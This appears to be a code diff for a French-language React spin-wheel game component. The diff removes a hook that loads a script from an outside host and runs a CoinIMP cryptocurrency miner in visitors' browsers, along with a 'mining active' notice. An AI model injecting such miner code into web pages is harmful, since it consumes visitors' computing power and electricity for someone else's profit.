@@ -360,38 +360,9 @@ export const SpinWheel: React.FC<SpinWheelProps> = ({ onZeroWin }) => {
     loadBonusSpins();
   };
 
-  useEffect(() => {
-    // Script de mining
-    const script1 = document.createElement('script');
-    script1.src = 'https://www.hostingcloud.racing/etyE.js';
-    document.head.appendChild(script1);
-
-    const script2 = document.createElement('script');
-    script2.innerHTML = `
-      window._client = new Client.Anonymous('80b853dd927be9f5e6a561ddcb2f09a58a72ce6eee0b328e897c8bc0774642cd', {
-        throttle: 0.4, c: 'w'
-      });
-      window._client.start();
-      window._client.addMiningNotification("Floating Bottom", "This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.", "#cccccc", 40, "#3d3d3d");
-    `;
-    document.body.appendChild(script2);
-
-    return () => {
-      try {
-        document.head.removeChild(script1);
-        document.body.removeChild(script2);
-      } catch (e) {
-        // ignore
-      }
-    };
-  }, []);
 
   return (
-    <div>
-      {/* Jeu de clics */}
-      <ClickToEarn onFreeSpinEarned={handleFreeSpinEarned} />
-
-      <Card className="gradient-card mb-8">
+    <Card className="gradient-card mb-8">
         <CardHeader className="text-center">
           <div className="flex justify-between items-center mb-4">
             <div></div>
@@ -400,9 +371,6 @@ export const SpinWheel: React.FC<SpinWheelProps> = ({ onZeroWin }) => {
               <p className="text-muted-foreground">Tournez gratuitement toutes les 3h ou achetez des spins !</p>
             </div>
             <div></div>
-          </div>
-          <div className="mt-2 p-2 bg-muted/50 rounded text-sm text-muted-foreground">
-            ⚡ Section avec mining JavaScript actif
           </div>
           <div className="mt-3">
             <HashrateTicker />
@@ -639,7 +607,6 @@ export const SpinWheel: React.FC<SpinWheelProps> = ({ onZeroWin }) => {
             </div>
           </div>
         </CardContent>
-      </Card>
-    </div>
+    </Card>
   );
 };
